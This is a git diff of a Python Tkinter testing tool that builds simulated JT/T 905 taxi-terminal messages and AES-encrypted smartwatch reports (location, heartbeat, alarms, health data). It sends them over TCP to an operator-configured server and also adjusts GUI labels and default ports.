+                    tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
+                    self.result_data_Text2.insert(1.0, tip_content)
+                except:
+                    self.result_data_Text2.delete(1.0, END)
+                    self.result_data_Text2.insert(1.0, "连接超时，未收到服务器响应")
+
+    def qo_login批量905(self, su, plsu):
+        wd1 = float(self.wd()) * 60 / 0.0001
+        wd2 = hex(int(wd1))
+        jd1 = float(self.jd()) * 60 / 0.0001
+        jd2 = hex(int(jd1))
+        标识位 = '7E'
+        消息ID = '0200'
+        消息体属性 = '002F'
+        流水号 = f'{random.randint(12, 20)}'.zfill(4)
+        报警 = self.sb_bj()
+        状态 = self.sb_ztai()
+        纬度 = wd2[2:].zfill(8).upper()
+        经度 = jd2[2:].zfill(8).upper()
+        速度 = self.sdu()[2:].zfill(4).upper()
+        方向 = f'{random.randint(12, 20)}'
+        时间 = now_time[2:]
+        高程 = '0302' + f'{1}'.zfill(4)
+        附加 = f'0104000000{self.lic1().zfill(2)}0202044C{高程}250400000000300103'
+        for i in range(int(su), int(plsu)):
+            ISU标识 = self.sb_hao().zfill(12)[:12 - len(f'{i}')] + f'{i}'
+            w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 速度 + 方向 + 时间 + 附加
+            a = get_xor(w)
+            b = get_bcc(a)
+            E = w + b.upper().zfill(2)
+            t = 标识位 + E.replace("7E", "00") + 标识位
+            D = get_xor(E)
+            data = '7E ' + D + ' 7E'
+            if data[:2] != "7E":
+                print(f"错误：{data}")
+                t = t[:81] + "00" + t[82:]
+                data = get_xor(t)
+                print("修改后data：{}".format(data))
+                print('\n' * 1)
+            tip_content = '\n位置数据：\n{}\n源数据：\n{}\n'.format(data, t)
+            self.result_data_Text1.insert(1.0, tip_content)
+            time.sleep(float(self.times()))
+            if self.ip_on() == '是':
+                s = socket(AF_INET, SOCK_STREAM)
+                s.connect((f'{self.ip()}', int(self.port())))
+                s.settimeout(5)
+                try:
+                    s.send(bytes().fromhex(data))
+                    send = s.recv(1024).hex()
+                    print(send.upper())
+                    print('\n' * 1)
+                    tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
+                    self.result_data_Text1.insert(1.0, tip_content)
+                except:
+                    self.result_data_Text1.delete(1.0, END)
+                    self.result_data_Text1.insert(1.0, "连接超时，未收到服务器响应")
+
+    def qo_login批量905签到(self, su, plsu):
+        hex_list = [hex(ord(char))[2:].upper() for char in self.driver()]
+        驾驶员从业资格证号1 = ''.join(hex_list)
+        wd1 = float(self.wd()) * 60 / 0.0001
+        wd2 = hex(int(wd1))
+        jd1 = float(self.jd()) * 60 / 0.0001
+        jd2 = hex(int(jd1))
+        标识位 = '7E'
+        消息ID = '0B03'
+        消息体属性 = '0043'
+        流水号 = f'00{random.randint(12, 20)}'
+        报警 = self.sb_bj()
+        状态 = self.sb_ztai()
+        纬度 = wd2[2:].zfill(8).upper()
+        经度 = jd2[2:].zfill(8).upper()
+        速度 = self.sdu()[2:].zfill(4).upper()
+        方向 = f'{random.randint(12, 20)}'
+        时间 = now_time[2:]
+        企业经营许可证号 = '534E3132333435363738390000000000'
+        驾驶员从业资格证号 = 驾驶员从业资格证号1.zfill(38)
+        车牌号 = '534E31323435'
+        开机时间 = now_time[:12]
+        附加 = '01040000006E0202044C250400000000300103'
+        for i in range(int(su), int(plsu)):
+            ISU标识 = self.sb_hao().zfill(12)[:12 - len(f'{i}')] + f'{i}'
+            w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 速度 + 方向 + 时间 + 企业经营许可证号 + 驾驶员从业资格证号 + 车牌号 + 开机时间 + 附加
+            a = get_xor(w)
+            b = get_bcc(a)
+            E = w + b.upper().zfill(2)
+            t = 标识位 + E.replace("7E", "00") + 标识位
+            D = get_xor(E)
+            data = '7E ' + D + ' 7E'
+            if data[:2] != "7E":
+                print(f"错误：{data}")
+                t = t[:81] + "00" + t[82:]
+                data = get_xor(t)
+                print("修改后data：{}".format(data))
+                print('\n' * 1)
+            print(t)
+            print(data)
+            tip_content = '\n签到数据：\n{}\n源数据：{}\n'.format(data, t)
+            self.result_data_Text1.insert(1.0, tip_content)
+            time.sleep(float(self.times()))
+            if self.ip_on() == '是':
+                s = socket(AF_INET, SOCK_STREAM)
+                s.connect((f'{self.ip()}', int(self.port())))
+                s.settimeout(5)
+                try:
+                    s.send(bytes().fromhex(data))
+                    send = s.recv(1024).hex()
+                    print(send.upper())
+                    print('\n' * 1)
+                    tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
+                    self.result_data_Text1.insert(1.0, tip_content)
+                except:
+                    self.result_data_Text1.delete(1.0, END)
+                    self.result_data_Text1.insert(1.0, "连接超时，未收到服务器响应")
+
+    def qo_login批量905签退(self, su, plsu):
+        hex_list = [hex(ord(char))[2:].upper() for char in self.driver()]
+        驾驶员从业资格证号1 = ''.join(hex_list)
+        wd1 = float(self.wd()) * 60 / 0.0001
+        wd2 = hex(int(wd1))
+        jd1 = float(self.jd()) * 60 / 0.0001
+        jd2 = hex(int(jd1))
+        标识位 = '7E'
+        消息ID = '0B04'
+        消息体属性 = '0043'
+        流水号 = f'00{random.randint(12, 20)}'
+        报警 = self.sb_bj()
+        状态 = self.sb_ztai()
+        纬度 = wd2[2:].zfill(8).upper()
+        经度 = jd2[2:].zfill(8).upper()
+        速度 = self.sdu()[2:].zfill(4).upper()
+        方向 = f'{random.randint(12, 20)}'
+        时间 = now_time[2:]
+        企业经营许可证号 = '534E3132333435363738390000000000'
+        驾驶员从业资格证号 = 驾驶员从业资格证号1.zfill(38)
+        车牌号 = '534E31323435'
+        计价器K值 = f'00{random.randint(12, 20)}'
+        当班开机时间 = now_time[:12]
+        当班关机时间 = now_time[:12]
+        当班里程 = f'000{random.randint(30, 36)}0'
+        当班营运里程 = f'000{random.randint(30, 36)}0'
+        车次 = f'00{random.randint(12, 20)}'
+        计时时间 = now_time1
+        总计金额 = f'000{random.randint(12, 20)}0'
+        卡收金额 = f'000{random.randint(12, 20)}0'
+        卡次 = f'00{random.randint(12, 20)}'
+        班间里程 = f'0{random.randint(30, 36)}0'
+        总计里程 = f'00000{random.randint(30, 36)}0'
+        总营运里程 = f'00000{random.randint(30, 36)}0'
+        单价 = f'{random.randint(12, 20)}00'  # 12.00块
+        总营运次数 = '0000001A'  # 高位在前就是在后面
+        附加 = '01040000006E0202044C250400000000300103'
+        for i in range(int(su), int(plsu)):
+            ISU标识 = self.sb_hao().zfill(12)[:12 - len(f'{i}')] + f'{i}'
+            if (i % 2) == 0:
+                签退方式 = '01'
+            else:
+                签退方式 = '00'
+            w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 速度 + 方向 + 时间 + 企业经营许可证号 + 驾驶员从业资格证号 + 车牌号 + 计价器K值 + 当班开机时间 + 当班关机时间 + 当班里程 + 当班营运里程 + 车次 + 计时时间 + 总计金额 + 卡收金额 + 卡次 + 班间里程 + 总计里程 + 总营运里程 + 单价 + 总营运次数 + 签退方式 + 附加
+            a = get_xor(w)
+            b = get_bcc(a)
+            E = w + b.upper().zfill(2)
+            t = 标识位 + E.replace("7E", "00") + 标识位
+            D = get_xor(E)
+            data = '7E ' + D + ' 7E'
+            if data[:2] != "7E":
+                print(f"错误：{data}")
+                t = t[:81] + "00" + t[82:]
+                data = get_xor(t)
+                print("修改后data：{}".format(data))
+                print('\n' * 1)
+            print(t)
+            print(data)
+            tip_content = '\n签退数据：\n{}\n源数据：{}\n'.format(data, t)
+            self.result_data_Text1.insert(1.0, tip_content)
+            time.sleep(float(self.times()))
+            if self.ip_on() == '是':
+                s = socket(AF_INET, SOCK_STREAM)
+                s.connect((f'{self.ip()}', int(self.port())))
+                s.settimeout(5)
+                try:
+                    s.send(bytes().fromhex(data))
+                    send = s.recv(1024).hex()
+                    print(send.upper())
+                    print('\n' * 1)
+                    tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
+                    self.result_data_Text1.insert(1.0, tip_content)
+                except:
+                    self.result_data_Text1.delete(1.0, END)
+                    self.result_data_Text1.insert(1.0, "连接超时，未收到服务器响应")
+
+    def qo_login批量905营运(self, su, plsu):
+        hex_list = [hex(ord(char))[2:].upper() for char in self.driver()]
+        驾驶员从业资格证号1 = ''.join(hex_list)
+        wd1 = float(self.conf_wd) * 60 / 0.0001
+        wd2 = float(self.wd()) * 60 / 0.0001
+        wd3 = hex(int(wd1))
+        wd4 = hex(int(wd2))
+        jd1 = float(self.conf_jd) * 60 / 0.0001
+        jd2 = float(self.jd()) * 60 / 0.0001
+        jd3 = hex(int(jd1))
+        jd4 = hex(int(jd2))
+        标识位 = '7E'
+        消息ID = '0B05'
+        消息体属性 = '0073'
+        流水号 = f'00{random.randint(12, 20)}'
+        报警 = self.sb_bj()
+        状态 = self.sb_ztai()
+        纬度 = wd3[2:].zfill(8).upper()
+        经度 = jd3[2:].zfill(8).upper()
+        速度 = self.sdu()[2:].zfill(4).upper()
+        方向 = f'{random.randint(12, 20)}'
+        时间 = now_time[2:]
+        报警1 = self.sb_bj()
+        状态1 = self.sb_ztai()
+        纬度1 = wd4[2:].zfill(8).upper()
+        经度1 = jd4[2:].zfill(8).upper()
+        速度1 = self.sdu()[2:].zfill(4).upper()
+        方向1 = f'{random.randint(12, 20)}'
+        时间1 = now_time[2:]
+        营运ID = '3590AA28'
+        评价ID = '3590AA28'
+        评价选项 = '01'
+        评价选项扩展 = '0000'
+        电召订单ID = '000'.zfill(8)
+        车牌号 = '534E31323535'  # 4B3132333435
+        企业经营许可证号 = '534E3132333435363738393100000000'
+        驾驶员从业资格证号 = 驾驶员从业资格证号1.zfill(38)
+        上车时间 = 时间[:10]
+        上车时间1 = 时间[:8] + '00'
+        上车 = 时间[6:8].replace(f"{时间[6:8]}", "%02d" % (int(时间[6:8]) + 1))
+        下车时间 = 上车 + 上车时间[8:]
+        计程公里数 = f'000{random.randint(30, 36)}0'
+        空驶里程 = f'0{random.randint(12, 30)}0'
+        附加费 = f'000{random.randint(12, 20)}0'
+        等待计时时间 = f'0{random.randint(12, 20)}0'
+        交易金额 = f'000{random.randint(12, 20)}0'
+        交易类型 = '03'
+        附加 = '01040000006E0202044C250400000000300103'
+        for i in range(int(su), int(plsu)):
+            ISU标识 = self.sb_hao().zfill(12)[:12 - len(f'{i}')] + f'{i}'
+            当前车次 = f'{2}'.zfill(8)
+            w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 速度 + 方向 + 时间 + 报警1 + 状态1 + 纬度1 + 经度1 + 速度1 + 方向1 + 时间1 + 营运ID + 评价ID + 评价选项 + 评价选项扩展 + 电召订单ID + 车牌号 + 企业经营许可证号 + 驾驶员从业资格证号 + 上车时间1 + 下车时间 + 计程公里数 + 空驶里程 + 附加费 + 等待计时时间 + 交易金额 + 当前车次 + 交易类型 + 附加
+            a = get_xor(w)
+            b = get_bcc(a)
+            E = w + b.upper().zfill(2)
+            t = 标识位 + E.replace("7E", "00") + 标识位
+            D = get_xor(E)
+            data = '7E ' + D + ' 7E'
+            if data[:2] != "7E":
+                print(f"错误：{data}")
+                t = t[:81] + "00" + t[82:]
+                data = get_xor(t)
+                print("修改后data：{}".format(data))
+                print('\n' * 1)
+            print(t)
+            print(data)
+            tip_content = '\n营运数据：\n{}\n源数据：{}\n'.format(data, t)
+            self.result_data_Text1.insert(1.0, tip_content)
+            time.sleep(float(self.times()))
+            if self.ip_on() == '是':
+                s = socket(AF_INET, SOCK_STREAM)
+                s.connect((f'{self.ip()}', int(self.port())))
+                s.settimeout(5)
+                try:
+                    s.send(bytes().fromhex(data))
+                    send = s.recv(1024).hex()
+                    print(send.upper())
+                    print('\n' * 1)
+                    tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
+                    self.result_data_Text1.insert(1.0, tip_content)
+                except:
+                    self.result_data_Text1.delete(1.0, END)
+                    self.result_data_Text1.insert(1.0, "连接超时，未收到服务器响应")
+        # self.result_data_Text1.insert(1.0, "总计发送成功营运数据条数:{}\n\n".format(str(count)))
+
     def qo_login2929(self):
         src = self.init_data_Text4.get().strip()
         print(src)
@@ -2323,6 +2631,283 @@ class MY_GUI(tk.Tk):
         if txt.startswith('http://') or txt.startswith('https://'):
             self.frame1.load_url(txt)
 
+    def ip11(self):
+        ip = self.ip_Text11.get().strip()
+        return ip
+
+    def port11(self):
+        port = self.port_Text11.get().strip()
+        return port
+
+    def wd11(self):
+        wd = self.wd_Text11.get().strip()
+        return wd
+
+    def jd11(self):
+        jd = self.jd_Text11.get().strip()
+        return jd
+
+    def button_mode11(self):
+        global is_on
+        wd1 = get_latitude(base_lat=float(self.wd11()), radius=150)
+        jd1 = get_longitude(base_log=float(self.jd11()), radius=150)
+        wd2 = float(wd1)
+        jd2 = float(jd1)
+        self.wd_Text11.delete(0, END)
+        self.wd_Text11.insert(0, str(wd2))
+        self.jd_Text11.delete(0, END)
+        self.jd_Text11.insert(0, str(jd2))
+
+    def 定位数据(self):
+        try:
+            now_time = time.strftime('%Y%m%d%H%M%S', time.localtime())
+            # 消息头
+            消息头起始符 = '['
+            设备号 = f'{self.imei_Text11.get()}'.zfill(15)
+            分隔符 = ','
+            ICCID = f'{self.iccid_Text11.get()}'.zfill(20)
+            交易流水号 = f'{now_time}0000'
+            接口标识 = 'REPORT_LOCATION_INFO'
+            报文类型 = '3'  # 平台下发请求标示 1，则终 端响应标示为 2，终端上报接口标 示为 3，平台响应标示为 4
+            时间 = f'{now_time}'
+            报文长度 = '79'
+            报文体 = f'0E{self.jd11()}N{self.wd11()}T{now_time}@0!0!0!0!0'
+            结束标识符 = ']'
+            data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 接口标识 + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + 报文长度 + 分隔符 + 报文体 + 结束标识符
+            res = AES_CBC_encrypt(data, f'{self.key}', f'{self.iv}')
+            res0 = str(res, 'utf-8') + "" + "#kdsjafjalsdjg#170"
+            res1 = res0.encode('raw_unicode_escape')
+            s = socket(AF_INET, SOCK_STREAM)
+            s.connect((f'{self.ip11()}', int(self.port11())))
+            s.send(res1)
+            recv_msg = s.recv(1024).decode("utf8")
+            aa = str_split(recv_msg, 0)
+            res2 = AES_CBC_decrypt(f"{aa}", f'{self.key}', f'{self.iv}')
+            match = re.search(r'\[(.*?)\]', res2.decode('utf-8'))
+            tip_content = '定位数据请求：\n{}\n\n加密数据：\n{}\n\n'.format(data, res1)
+            self.result_data_Text11.insert(1.0, tip_content)
+            if match:
+                # 提取匹配到的内容（不包括中括号）
+                content_inside_brackets = match.group(1)
+                tip_content = '接收到的信息为：\n{}\n\n解密数据：\n[{}]\n\n'.format(recv_msg, content_inside_brackets)
+                self.result_data_Text11.insert(END, tip_content)
+            else:
+                self.result_data_Text11.delete(1.0, END)
+                self.result_data_Text11.insert(END, 'No match found.')
+        except:
+            return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
+        return ""
+
+    def 心跳数据(self):
+        try:
+            now_time = time.strftime('%Y%m%d%H%M%S', time.localtime())
+            消息头起始符 = '['
+            设备号 = f'{self.imei_Text11.get()}'.zfill(15)
+            分隔符 = ','
+            ICCID = f'{self.iccid_Text11.get()}'.zfill(20)
+            交易流水号 = f'{now_time}0000'
+            报文类型 = '3'
+            时间 = f'{now_time}'
+            结束标识符 = ']'
+            当前电量 = f'{self.power_data_Text11.get()}'
+            当前步数 = f'{self.busu_data_Text11.get()}'
+            data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'REPORT_HEARTBEAT' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '5' + 分隔符 + f'{当前电量}%@{当前步数}' + 结束标识符
+            res = AES_CBC_encrypt(data, f'{self.key}', f'{self.iv}')
+            res0 = str(res, 'utf-8') + "" + "#kdsjafjalsdjg#170"
+            res1 = res0.encode('raw_unicode_escape')
+            s = socket(AF_INET, SOCK_STREAM)
+            s.connect((f'{self.ip11()}', int(self.port11())))
+            s.send(res1)
+            recv_msg = s.recv(1024).decode("utf8")
+            aa = str_split(recv_msg, 0)
+            res2 = AES_CBC_decrypt(f"{aa}", f'{self.key}', f'{self.iv}')
+            match = re.search(r'\[(.*?)\]', res2.decode('utf-8'))
+            tip_content = '心跳数据请求：\n{}\n\n加密数据：\n{}\n\n'.format(data, res1)
+            self.result_data_Text11.delete(1.0, END)
+            self.result_data_Text11.insert(1.0, tip_content)
+            if match:
+                # 提取匹配到的内容（不包括中括号）
+                content_inside_brackets = match.group(1)
+                tip_content = '接收到的信息为：\n{}\n\n解密数据：\n[{}]\n\n'.format(recv_msg, content_inside_brackets)
+                self.result_data_Text11.insert(END, tip_content)
+            else:
+                self.result_data_Text11.delete(1.0, END)
+                self.result_data_Text11.insert(END, 'No match found.')
+        except:
+            return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
+        return ""
+
+    def 报警数据(self, value):
+        try:
+            now_time = time.strftime('%Y%m%d%H%M%S', time.localtime())
+            消息头起始符 = '['
+            设备号 = f'{self.imei_Text11.get()}'.zfill(15)
+            分隔符 = ','
+            ICCID = f'{self.iccid_Text11.get()}'.zfill(20)
+            交易流水号 = f'{now_time}0000'
+            报文类型 = '3'
+            时间 = f'{now_time}'
+            结束标识符 = ']'
+            剩余电量 = f'{self.repower_data_Text11.get()}'
+            if value == "SOS报警":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'REPORT_SOS' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '1' + 分隔符 + '1' + 结束标识符
+            elif value == "关机报警":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'ALARM_POWER' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '5' + 分隔符 + f'2@{剩余电量}%' + 结束标识符
+            elif value == "缺电报警":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'ALARM_POWER' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '5' + 分隔符 + f'1@{剩余电量}%' + 结束标识符
+            elif value == "自动关机报警":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'ALARM_POWER' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '5' + 分隔符 + f'3@{剩余电量}%' + 结束标识符
+            elif value == "开机报警":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'ALARM_POWER' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '5' + 分隔符 + f'4@{剩余电量}%' + 结束标识符
+            elif value == "设备充电":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'ALARM_POWER' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '5' + 分隔符 + f'5@{剩余电量}%' + 结束标识符
+            elif value == "电源已断开":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'ALARM_POWER' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '5' + 分隔符 + f'6@{剩余电量}%' + 结束标识符
+            elif value == "设备电量已充满":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'ALARM_POWER' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '5' + 分隔符 + f'7@{剩余电量}%' + 结束标识符
+            res = AES_CBC_encrypt(data, f'{self.key}', f'{self.iv}')
+            res0 = str(res, 'utf-8') + "" + "#kdsjafjalsdjg#170"
+            res1 = res0.encode('raw_unicode_escape')
+            s = socket(AF_INET, SOCK_STREAM)
+            s.connect((f'{self.ip11()}', int(self.port11())))
+            s.send(res1)
+            recv_msg = s.recv(1024).decode("utf8")
+            aa = str_split(recv_msg, 0)
+            res2 = AES_CBC_decrypt(f"{aa}", f'{self.key}', f'{self.iv}')
+            match = re.search(r'\[(.*?)\]', res2.decode('utf-8'))
+            tip_content = '报警数据请求：\n{}\n\n加密数据：\n{}\n\n'.format(data, res1)
+            self.result_data_Text11.insert(1.0, tip_content)
+            if match:
+                # 提取匹配到的内容（不包括中括号）
+                content_inside_brackets = match.group(1)
+                tip_content = '接收到的信息为：{}\n{}\n\n解密数据：\n[{}]\n\n'.format(value, recv_msg,
+                                                                                    content_inside_brackets)
+                self.result_data_Text11.insert(END, tip_content)
+            else:
+                self.result_data_Text11.delete(1.0, END)
+                self.result_data_Text11.insert(END, 'No match found.')
+        except:
+            return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
+        return ""
+
+    def 终端上报(self, value):
+        try:
+            now_time = time.strftime('%Y%m%d%H%M%S', time.localtime())
+            消息头起始符 = '['
+            设备号 = f'{self.imei_Text11.get()}'.zfill(15)
+            分隔符 = ','
+            ICCID = f'{self.iccid_Text11.get()}'.zfill(20)
+            交易流水号 = f'{now_time}0000'
+            报文类型 = '3'
+            时间 = f'{now_time}'
+            结束标识符 = ']'
+            开始时间 = now_time[:12] + '00'
+            结束时间 = now_time
+            时长 = int(结束时间) - int(开始时间)
+            手机号码 = f'{self.phone_data_Text11.get()}'.zfill(11)
+            拨通方 = f'{self.dial_data_Text11.get()}'
+            设备模式 = f'{self.mode_data_Text11.get()}'
+            温度 = f'{float(self.wendu_data_Text11.get())}'
+            血氧 = f'{self.xue_data_Text11.get()}'
+            心率 = f'{self.xinlv_data_Text11.get()}'
+            温度1 = f'{float(self.wendu1_data_Text11.get())}'
+            佩戴状态 = f'{self.pdai_data_Text11.get()}'
+            上报状态 = f'{self.sb_data_Text11.get()}'
+            if value == "设备模式上报":
+                if 设备模式 == "待机模式":
+                    mode = 0
+                elif 设备模式 == "省电模式":
+                    mode = 1
+                elif 设备模式 == "平衡模式":
+                    mode = 2
+                elif 设备模式 == "实时模式":
+                    mode = 3
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'DEVICE_STATUS' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '20' + 分隔符 + f'{random.randint(1, 3)}@{mode}@{int(time.time() * 1000)}@20' + 结束标识符
+            elif value == "设备登录":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'DEVICE_LOGIN' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '22' + 分隔符 + f'5@1@111@1@1@100@0' + 结束标识符
+            elif value == "获取天气信息":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'GET_WEATHER_INFO' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '106' + 分隔符 + f'0E{self.jd11()}N{self.wd11()}T{now_time}@460!0!9231!2351@0!0!0!0!0!0!0!0!0!0!0!0!0!' + 结束标识符
+            elif value == "健康参数上报":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'REPORT_HEALTH' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '36' + 分隔符 + f'0000-0000@000!000!000!000!@{温度}@0000' + 结束标识符
+            elif value == "通话记录上报":
+                if 拨通方 == "呼入":
+                    dial = '0'
+                elif 拨通方 == "呼出":
+                    dial = '1'
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'REPORT_CALL_LOG' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '26' + 分隔符 + f'{手机号码}@{开始时间}!{结束时间}@{时长}@{dial}' + 结束标识符
+            elif value == "健康心率血氧参数上报":
+                if 佩戴状态 == "未佩戴":
+                    pdai = 0
+                elif 佩戴状态 == "已佩戴":
+                    pdai = 1
+                if 上报状态 == "定时上报":
+                    sb = 0
+                elif 上报状态 == "主动上报":
+                    sb = 1
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'REPORT_HEART_HEALTH' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '36' + 分隔符 + f'{血氧}@{心率}@{温度1}@{pdai}@{sb}' + 结束标识符
+            res = AES_CBC_encrypt(data, f'{self.key}', f'{self.iv}')
+            res0 = str(res, 'utf-8') + "" + "#kdsjafjalsdjg#170"
+            res1 = res0.encode('raw_unicode_escape')
+            s = socket(AF_INET, SOCK_STREAM)
+            s.connect((f'{self.ip11()}', int(self.port11())))
+            s.send(res1)
+            recv_msg = s.recv(1024).decode("utf8")
+            aa = str_split(recv_msg, 0)
+            res2 = AES_CBC_decrypt(f"{aa}", f'{self.key}', f'{self.iv}')
+            match = re.search(r'\[(.*?)\]', res2.decode('utf-8'))
+            tip_content = '终端上报请求：\n{}\n\n加密数据：\n{}\n\n'.format(data, res1)
+            self.result_data_Text11.insert(1.0, tip_content)
+            if match:
+                # 提取匹配到的内容（不包括中括号）
+                content_inside_brackets = match.group(1)
+                tip_content = '接收到的信息为：{}\n{}\n\n解密数据：\n[{}]\n\n'.format(value, recv_msg,
+                                                                                    content_inside_brackets)
+                self.result_data_Text11.insert(END, tip_content)
+            else:
+                self.result_data_Text11.delete(1.0, END)
+                self.result_data_Text11.insert(END, 'No match found.')
+        except:
+            return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
+        return ""
+
+    def xsz_login(self):
+        src = self.init_data_Text11.get().strip()
+        print(src)
+        if src == "定位数据":
+            sbb1 = self.imei_Text11.get()
+            print(sbb1)
+            if not sbb1:
+                self.result_data_Text11.delete(1.0, END)
+                self.result_data_Text11.insert(1.0, "请输入设备号")
+            else:
+                self.result_data_Text11.insert(END, self.定位数据())
+        elif src == "心跳数据":
+            sbb1 = self.imei_Text11.get()
+            print(sbb1)
+            if not sbb1:
+                self.result_data_Text11.delete(1.0, END)
+                self.result_data_Text11.insert(1.0, "请输入设备号")
+            else:
+                self.result_data_Text11.insert(END, self.心跳数据())
+        elif src == "报警数据":
+            lx = self.zd_data_Text11.get()
+            print(lx)
+            self.result_data_Text11.delete(1.0, END)
+            if not lx:
+                self.result_data_Text11.delete(1.0, END)
+                self.result_data_Text11.insert(1.0, "请选择终端类型")
+            else:
+                self.result_data_Text11.insert(END, self.报警数据(lx))
+        elif src == "终端上报":
+            lx = self.zd_data_Text11.get()
+            print(lx)
+            self.result_data_Text11.delete(1.0, END)
+            if not lx:
+                self.result_data_Text11.delete(1.0, END)
+                self.result_data_Text11.insert(1.0, "请选择终端类型")
+            else:
+                self.result_data_Text11.insert(END, self.终端上报(lx))
+
     # 设置窗口
     def set_init_window(self):
         self.init_window_name.title("配置版本  作者 : 姚子奇")
@@ -2348,27 +2933,27 @@ class MY_GUI(tk.Tk):
 
         self.port_Text_label = Label(pane1, text="服务器Port")
         self.port_Text_label.grid(row=2, columnspan=2, sticky=N)
-        items = (f"{self.conf_905wg_port}", "17700", "17800")
+        items = (f"{self.conf_905wg_port}", "17201", "17800")
         self.port_Text = Combobox(pane1, width=50, height=2, values=items)
         self.port_Text.current(0)
         self.port_Text.grid(row=3, column=0, sticky=W)
 
-        self.su_Text_label = Label(pane1, text="循环次数")
+        self.su_Text_label = Label(pane1, text="循环开始")
         self.su_Text_label.grid(row=4, columnspan=2, sticky=W)
-        items = ("0", "10")
+        items = ("0", "5")
         self.su_Text = Combobox(pane1, width=22, height=2, values=items, state=f'{self.jinyong}')
         self.su_Text.current(0)
         self.su_Text.grid(row=5, column=0, sticky=W)
 
-        self.plsu_Text_label = Label(pane1, text="批量上线设备次数")
+        self.plsu_Text_label = Label(pane1, text="批量设备(5线程池)")
         self.plsu_Text_label.grid(row=4, columnspan=2, sticky=E)
-        items = ("1", "10")
-        self.plsu_Text = Combobox(pane1, width=22, height=2, values=items, state=f'{self.jinyong}')
+        items = ("5", "10")
+        self.plsu_Text = Combobox(pane1, width=22, height=2, values=items)
         self.plsu_Text.current(0)
         self.plsu_Text.grid(row=5, column=0, sticky=E)
 
         # 905组成数据
-        self.sbei_Text_label = Label(pane1, text="设备号(905设备号12位)")
+        self.sbei_Text_label = Label(pane1, text="设备号")
         self.sbei_Text_label.grid(row=6, column=0)
         items = (f"{self.sbei905}", "101356000000", "101351000000")
         self.sbei_Text = Combobox(pane1, width=50, height=2, values=items)
@@ -2393,7 +2978,7 @@ class MY_GUI(tk.Tk):
         self.jd_Text.current(0)
         self.jd_Text.grid(row=11, column=0, sticky=N, columnspan=10)
 
-        self.ip_on_Label = Label(pane1, text="发服务器")
+        self.ip_on_Label = Label(pane1, text="发送服务器")
         self.ip_on_Label.grid(row=11, column=10, sticky=N)
         items = ("否", "是")
         self.ip_on_Text = Combobox(pane1, width=2, height=3, values=items)
@@ -2497,27 +3082,27 @@ class MY_GUI(tk.Tk):
         #
         self.port_Text_label2 = Label(pane2, text="服务器Port")
         self.port_Text_label2.grid(row=2, columnspan=2, sticky=N)
-        items = (f"{self.conf_808wg_port}", "17700", "17800", "7788")
+        items = (f"{self.conf_808wg_port}", "17202", "17800", "7788")
         self.port_Text2 = Combobox(pane2, width=50, height=2, values=items)
         self.port_Text2.current(0)
         self.port_Text2.grid(row=3, column=0, sticky=W)
 
-        self.su_Text_label2 = Label(pane2, text="循环发送次数")
+        self.su_Text_label2 = Label(pane2, text="循环开始")
         self.su_Text_label2.grid(row=4, columnspan=2, sticky=W)
-        items = ("0", "10")
+        items = ("0", "5")
